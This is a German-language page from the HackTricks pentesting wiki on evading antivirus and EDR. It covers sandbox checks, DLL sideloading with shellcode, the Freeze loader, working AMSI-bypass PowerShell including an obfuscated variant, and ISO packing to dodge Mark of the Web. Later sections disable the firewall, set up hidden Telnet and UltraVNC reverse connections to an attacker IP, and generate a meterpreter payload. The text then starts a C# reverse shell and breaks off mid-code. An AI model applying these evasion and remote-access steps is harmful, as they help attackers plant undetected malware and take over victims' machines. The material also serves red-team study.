# Antivirus (AV) Umgehung

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

**Diese Seite wurde von** [**@m2rc\_p**](https://twitter.com/m2rc\_p)** geschrieben!**

## **AV Umgehungsmethodik**

Derzeit verwenden AVs verschiedene Methoden, um festzustellen, ob eine Datei bösartig ist oder nicht: statische Erkennung, dynamische Analyse und für fortgeschrittenere EDRs Verhaltensanalyse.

### **Statische Erkennung**

Die statische Erkennung wird erreicht, indem bekannte bösartige Zeichenfolgen oder Byte-Arrays in einem Binär- oder Skriptdatei markiert werden und auch Informationen aus der Datei selbst extrahiert werden (z. B. Dateibeschreibung, Unternehmensname, digitale Signaturen, Symbol, Prüfsumme usw.). Dies bedeutet, dass die Verwendung bekannter öffentlicher Tools Sie leichter entlarven kann, da sie wahrscheinlich analysiert und als bösartig markiert wurden. Es gibt ein paar Möglichkeiten, diese Art der Erkennung zu umgehen:

* **Verschlüsselung**

Wenn Sie das Binärprogramm verschlüsseln, gibt es für den AV keine Möglichkeit, Ihr Programm zu erkennen, aber Sie benötigen eine Art Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

* **Verschleierung**

Manchmal müssen Sie nur einige Zeichenfolgen in Ihrem Binär- oder Skriptdatei ändern, um sie am AV vorbeizubekommen, aber dies kann je nachdem, was Sie verschleiern möchten, eine zeitaufwändige Aufgabe sein.

* **Benutzerdefinierte Tools**

Wenn Sie Ihre eigenen Tools entwickeln, gibt es keine bekannten schlechten Signaturen, aber dies erfordert viel Zeit und Mühe.

{% hint style="info" %}
Ein guter Weg, um gegen die statische Erkennung von Windows Defender vorzugehen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Wesentlichen in mehrere Segmente auf und fordert dann Defender auf, jedes einzelne Segment zu scannen. Auf diese Weise kann es Ihnen genau sagen, welche Zeichenfolgen oder Bytes in Ihrem Binärprogramm markiert sind.
{% endhint %}

Ich empfehle Ihnen dringend, sich diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) zur praktischen AV-Umgehung anzusehen.

### **Dynamische Analyse**

Die dynamische Analyse erfolgt, wenn der AV Ihr Binärprogramm in einer Sandbox ausführt und nach bösartigen Aktivitäten sucht (z. B. Versuch, Ihre Browserpasswörter zu entschlüsseln und zu lesen, Durchführung eines Minidumps auf LSASS usw.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die Sie tun können, um Sandboxes zu umgehen.

* **Warten vor der Ausführung** Je nach Implementierung kann dies eine großartige Möglichkeit sein, die dynamische Analyse des AV zu umgehen. AVs haben nur sehr wenig Zeit, um Dateien zu scannen, um den Arbeitsablauf des Benutzers nicht zu unterbrechen. Daher können lange Wartezeiten die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit je nach Implementierung einfach überspringen können.
* **Überprüfung der Ressourcen des Computers** Normalerweise haben Sandboxes sehr wenig Ressourcen zur Verfügung (z. B. < 2 GB RAM), da sie sonst den Computer des Benutzers verlangsamen könnten. Hier können Sie auch sehr kreativ werden, z. B. indem Sie die CPU-Temperatur oder sogar die Lüftergeschwindigkeiten überprüfen, nicht alles wird in der Sandbox implementiert sein.
* **Überprüfungen spezifisch für den Computer** Wenn Sie einen Benutzer ins Visier nehmen möchten, dessen Arbeitsstation der Domäne "contoso.local" angehört, können Sie eine Überprüfung der Domäne des Computers durchführen, um zu sehen, ob sie mit der von Ihnen angegebenen übereinstimmt. Wenn nicht, können Sie Ihr Programm beenden.

Es stellt sich heraus, dass der Sandbox-Computername von Microsoft Defender HAL9TH ist. Sie können also den Computernamen in Ihrer Malware vor der Detonation überprüfen. Wenn der Name HAL9TH entspricht, bedeutet dies, dass Sie sich in der Sandbox des Verteidigers befinden. Sie können also Ihr Programm beenden.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) für den Kampf gegen Sandboxes

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits in diesem Beitrag erwähnt, werden **öffentliche Tools** letztendlich **erkannt**, daher sollten Sie sich etwas fragen:

Wenn Sie beispielsweise LSASS dumpen möchten, **müssen Sie wirklich mimikatz verwenden**? Oder könnten Sie ein anderes Projekt verwenden, das weniger bekannt ist und auch LSASS dumpen kann.

Die richtige Antwort ist wahrscheinlich letzteres. Nehmen wir mimikatz als Beispiel, es ist wahrscheinlich eines der, wenn nicht das am meisten von AVs und EDRs markierte Schadprogramm, obwohl das Projekt selbst super ist, ist es auch ein Albtraum, damit um AVs herumzuarbeiten. Suchen Sie also einfach nach Alternativen für das, was Sie erreichen möchten.

{% hint style="info" %}
Beim Modifizieren Ihrer Payloads zur Umgehung stellen Sie sicher, dass Sie die **automatische Musterübermittlung in Defender deaktivieren**, und bitte, ernsthaft, **LADEN SIE NICHT ZU VIRUSTOTAL HOCH**, wenn Ihr Ziel die langfristige Umgehung ist. Wenn Sie überprüfen möchten, ob Ihre Payload von einem bestimmten AV erkannt wird, installieren Sie ihn in einer VM, versuchen Sie, die automatische Musterübermittlung zu deaktivieren, und testen Sie ihn dort, bis Sie mit dem Ergebnis zufrieden sind.
{% endhint %}

## EXE vs. DLL

Immer, wenn möglich, **bevorzugen Sie die Verwendung von DLLs zur Umgehung**, in meiner Erfahrung werden DLL-Dateien in der Regel **viel weniger erkannt** und analysiert, daher ist es ein sehr einfacher Trick, um in einigen Fällen die Erkennung zu vermeiden (wenn Ihre Payload auf irgendeine Weise als DLL ausgeführt werden kann).

Wie wir in diesem Bild sehen können, hat eine DLL-Payload von Havoc eine Erkennungsrate von 4/26 in antiscan.me, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>Vergleich von antiscan.me einer normalen Havoc EXE-Payload und einer normalen Havoc DLL</p></figcaption></figure>

Nun werden wir einige Tricks zeigen, die Sie mit DLL-Dateien verwenden können, um viel unauffälliger zu sein.
## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem sowohl die Opferanwendung als auch bösartige Payloads nebeneinander positioniert werden.

Sie können Programme, die anfällig für DLL Sideloading sind, mithilfe von [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript überprüfen:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Dieser Befehl gibt die Liste der Programme aus, die anfällig für DLL-Hijacking im Verzeichnis "C:\Program Files\" sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle Ihnen dringend, **DLL-hijackbare/-sideloadbare Programme selbst zu erkunden**, diese Technik ist ziemlich unauffällig, wenn sie ordnungsgemäß durchgeführt wird. Wenn Sie jedoch öffentlich bekannte DLL-Sideloadable-Programme verwenden, könnten Sie leicht erwischt werden.

Allein durch das Platzieren einer bösartigen DLL mit dem Namen, den ein Programm erwartet zu laden, wird Ihr Payload nicht geladen, da das Programm bestimmte Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, werden wir eine andere Technik namens **DLL-Proxying/Forwarding** verwenden.

**DLL-Proxying** leitet die Aufrufe, die ein Programm von der Proxy-(und bösartigen) DLL ausführt, an die originale DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung Ihres Payloads ermöglicht wird.

Ich werde das [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-Projekt von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Folgende Schritte habe ich befolgt:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Der letzte Befehl wird uns 2 Dateien geben: eine DLL-Quellcodevorlage und die umbenannte Original-DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Dies sind die Ergebnisse:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die Proxy-DLL haben eine Erkennungsrate von 0/26 in [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ich **empfehle dringend**, sich [S3cur3Th1sSh1t's Twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading anzusehen und auch [ippsec's Video](https://www.youtube.com/watch?v=3eROsG\_WNpE), um mehr über das, was wir ausführlich besprochen haben, zu erfahren.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs mithilfe von angehaltenen Prozessen, direkten Systemaufrufen und alternativen Ausführungsmethoden`

Sie können Freeze verwenden, um Ihren Shellcode auf unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Evasion ist nur ein Katz- und Mausspiel, was heute funktioniert, könnte morgen entdeckt werden, also verlassen Sie sich niemals nur auf ein Tool, versuchen Sie wenn möglich, mehrere Ausweichtechniken zu verketten.
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI wurde erstellt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)" zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen, daher, wenn Sie Payloads **direkt im Speicher ausführen** könnten, konnte der AV nichts tun, um dies zu verhindern, da er nicht genügend Sichtbarkeit hatte.

Das AMSI-Feature ist in diese Komponenten von Windows integriert.

* Benutzerkontensteuerung oder UAC (Ausführung von EXE, COM, MSI oder ActiveX-Installation)
* PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
* Windows-Skript-Host (wscript.exe und cscript.exe)
* JavaScript und VBScript
* Office VBA-Makros

Es ermöglicht Antivirenlösungen, das Skriptverhalten zu überprüfen, indem Skriptinhalte in einer Form freigelegt werden, die sowohl unverschlüsselt als auch nicht verschleiert ist.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird den folgenden Alarm auf Windows Defender auslösen.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Beachten Sie, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei, aus der das Skript ausgeführt wurde, in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte abgelegt, wurden aber dennoch im Speicher erwischt, aufgrund von AMSI.

Es gibt ein paar Möglichkeiten, AMSI zu umgehen:

* **Verschleierung**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die Sie laden möchten, eine gute Möglichkeit sein, um die Erkennung zu umgehen.

Allerdings hat AMSI die Fähigkeit, Skripte zu entschlüsseln, auch wenn sie mehrere Ebenen haben, daher könnte Verschleierung je nach Ausführung eine schlechte Option sein. Dies macht es nicht so einfach zu umgehen. Manchmal reicht es jedoch aus, ein paar Variablennamen zu ändern, und Sie sind gut, also hängt es davon ab, wie stark etwas markiert wurde.

* **AMSI-Bypass**

Da AMSI implementiert wird, indem eine DLL in den PowerShell-Prozess (auch cscript.exe, wscript.exe usw.) geladen wird, ist es möglich, damit einfach zu manipulieren, selbst wenn Sie als unprivilegierter Benutzer ausgeführt werden. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, AMSI-Scans zu umgehen.

**Erzwingen eines Fehlers**

Das Erzwingen des Fehlschlags der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass kein Scan für den aktuellen Prozess initiiert wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt und Microsoft hat eine Signatur entwickelt, um eine breitere Verwendung zu verhindern.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Alles, was es brauchte, war eine Zeile Powershell-Code, um AMSI für den aktuellen Powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst markiert, daher ist eine Modifikation erforderlich, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI-Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Speicherpflasterung**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/\_RastaMouse/) entdeckt und beinhaltet das Finden der Adresse für die Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der benutzerdefinierten Eingabe) und das Überschreiben mit Anweisungen, um den Code für E\_INVALIDARG zurückzugeben. Auf diese Weise wird das Ergebnis des tatsächlichen Scans als 0 zurückgegeben, was als sauberes Ergebnis interpretiert wird.

{% hint style="info" %}
Bitte lesen Sie [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.
{% endhint %}

Es gibt auch viele andere Techniken, die verwendet werden, um AMSI mit PowerShell zu umgehen. Schauen Sie sich [**diese Seite**](basic-powershell-for-pentesters/#amsi-bypass) und [dieses Repository](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

## Verschleierung

Es gibt mehrere Tools, die verwendet werden können, um **C#-Klartextcode zu verschleiern**, **Metaprogrammierungsvorlagen** zur Kompilierung von Binärdateien zu generieren oder **kompilierte Binärdateien zu verschleiern**, wie zum Beispiel:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Verschleierer**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, eine Open-Source-Abspaltung des [LLVM](http://www.llvm.org/)-Kompilierungssuites bereitzustellen, die durch [Code-Verschleierung](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) und Manipulationssicherheit die Software-Sicherheit erhöht.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator zeigt, wie man die Sprache `C++11/14` verwendet, um zur Kompilierungszeit verschleierten Code zu generieren, ohne ein externes Tool zu verwenden oder den Compiler zu modifizieren.
* [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht verschleierter Operationen hinzu, die vom C++-Template-Metaprogrammierungsframework generiert werden und es demjenigen, der die Anwendung knacken möchte, etwas schwerer machen.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binärverschleierer, der verschiedene PE-Dateien wie: .exe, .dll, .sys verschleiern kann.
* [**metame**](https://github.com/a0rtega/metame): Metame ist ein einfacher metamorpher Code-Engine für beliebige ausführbare Dateien.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feinkörniges Code-Verschleierungsframework für von LLVM unterstützte Sprachen, das ROP (Return-Oriented Programming) verwendet. ROPfuscator verschleiert ein Programm auf der Assemblerebene, indem es reguläre Anweisungen in ROP-Ketten umwandelt und unser natürliches Konzept des normalen Kontrollflusses vereitelt.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE-Verschlüsseler, der in Nim geschrieben wurde.
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in Shellcode umwandeln und dann laden.

## SmartScreen & MoTW

Sie haben möglicherweise diesen Bildschirm gesehen, wenn Sie einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen funktioniert hauptsächlich mit einem rufbasierten Ansatz, was bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und somit den Endbenutzer alarmieren und daran hindern, die Datei auszuführen (obwohl die Datei immer noch ausgeführt werden kann, indem auf Mehr Info -> Trotzdem ausführen geklickt wird).

**MoTW** (Mark of The Web) ist ein [NTFS-Alternativer Datenstrom](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurde.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

{% hint style="info" %}
Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signierungszertifikat signiert sind, **SmartScreen nicht auslösen**.
{% endhint %}

Ein sehr effektiver Weg, um zu verhindern, dass Ihre Payloads das Mark of The Web erhalten, besteht darin, sie in irgendeiner Art von Container wie z. B. einer ISO zu verpacken. Dies geschieht, weil das Mark-of-the-Web (MOTW) **nicht** auf **nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabekontainer verpackt, um das Mark-of-the-Web zu umgehen.

Beispielverwendung:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demonstration zum Umgehen von SmartScreen, indem Payloads in ISO-Dateien verpackt werden, die [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) verwenden.

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Das Laden von C#-Binärdateien im Speicher ist seit geraumer Zeit bekannt und immer noch eine sehr gute Möglichkeit, Ihre Post-Exploitation-Tools auszuführen, ohne von AV erkannt zu werden.

Da der Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (Sliver, Covenant, Metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblys direkt im Speicher auszuführen, aber es gibt verschiedene Möglichkeiten, dies zu tun:

* **Fork\&Run**

Es beinhaltet das **Starten eines neuen Opferprozesses**, das Einspritzen Ihres post-exploitationsschädlichen Codes in diesen neuen Prozess, das Ausführen Ihres schädlichen Codes und das Beenden des neuen Prozesses, wenn er fertig ist. Diese Methode hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork- und Run-Methode besteht darin, dass die Ausführung außerhalb unseres Beacon-Implantatprozesses erfolgt. Das bedeutet, dass, wenn etwas bei unserer Post-Exploitation schief geht oder erkannt wird, die **Implantatüberlebenschance** **viel größer** ist. Der Nachteil ist, dass Sie eine **größere Chance** haben, von **Verhaltenserkennungen** erkannt zu werden.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Es geht darum, den post-exploitationsschädlichen Code **in seinen eigenen Prozess** einzuspritzen. Auf diese Weise können Sie vermeiden, einen neuen Prozess zu erstellen und von AV scannen zu lassen, aber der Nachteil ist, dass bei Problemen mit der Ausführung Ihres Payloads die **Beacon-Verlustchance** **viel größer** ist, da er abstürzen könnte.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Wenn Sie mehr über das Laden von C#-Assemblys erfahren möchten, lesen Sie diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Sie können auch C#-Assemblys **aus PowerShell** laden, schauen Sie sich [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's Video](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Verwendung anderer Programmiersprachen

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mithilfe anderer Sprachen auszuführen, indem der kompromittierten Maschine Zugriff **auf die auf dem vom Angreifer kontrollierten SMB-Share installierte Interpreterumgebung** gewährt wird.&#x20;

Durch die Bereitstellung von Zugriff auf die Interpreter-Binärdateien und die Umgebung auf dem SMB-Share können Sie **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repository zeigt: Defender scannt immer noch die Skripte, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen nicht-obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## Fortgeschrittene Ausweichmanöver

Ausweichmanöver sind ein sehr komplexes Thema, manchmal müssen Sie viele verschiedene Telemetriequellen in nur einem System berücksichtigen, daher ist es praktisch unmöglich, in ausgereiften Umgebungen vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die Sie vorgehen, wird ihre eigenen Stärken und Schwächen haben.

Ich empfehle Ihnen dringend, sich diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einblick in fortgeschrittenere Ausweichtechniken zu erhalten.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Dies ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Ausweichmanöver in der Tiefe.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Alte Techniken**

### **Überprüfen, welche Teile Defender als bösartig erkennt**

Sie können [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das Teile der Binärdatei **entfernt**, bis es herausfindet, welcher Teil von Defender als bösartig erkannt wird, und es Ihnen mitteilt.\
Ein weiteres Tool, das dasselbe tut, ist [**avred**](https://github.com/dobin/avred) mit einem öffentlichen Webangebot des Dienstes unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lassen Sie es **starten**, wenn das System gestartet wird, und **führen** Sie es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Ändern Sie den Telnet-Port** (stealth) und deaktivieren Sie die Firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laden Sie es herunter von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (Sie möchten die Bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führen Sie _**winvnc.exe**_ aus und konfigurieren Sie den Server:

* Aktivieren Sie die Option _Disable TrayIcon_
* Legen Sie ein Passwort in _VNC Password_ fest
* Legen Sie ein Passwort in _View-Only Password_ fest

Verschieben Sie dann die Binärdatei _**winvnc.exe**_ und die neu erstellte Datei _**UltraVNC.ini**_ in das **Opfer**

#### **Umgekehrte Verbindung**

Der **Angreifer** sollte **innerhalb** seines **Hosts** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit er bereit ist, eine umgekehrte **VNC-Verbindung** zu empfangen. Dann, innerhalb des **Opfers**: Starten Sie den winvnc-Dienst `winvnc.exe -run` und führen Sie `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um die Stealth zu wahren, dürfen Sie einige Dinge nicht tun

* Starten Sie `winvnc` nicht, wenn es bereits läuft, da sonst ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst wird. Überprüfen Sie mit `tasklist | findstr winvnc`, ob es läuft
* Starten Sie `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da sonst [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet wird
* Führen Sie `winvnc -h` nicht für Hilfe aus, da sonst ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird

### GreatSCT

Laden Sie es herunter von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Im Inneren von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Jetzt **starten Sie den Lister** mit `msfconsole -r file.rc` und **führen Sie** das **XML-Payload** mit aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Verteidiger wird den Prozess sehr schnell beenden.**

### Kompilieren unseres eigenen Reverse-Shells

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erster C# Reverse-Shell

Kompilieren Sie es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
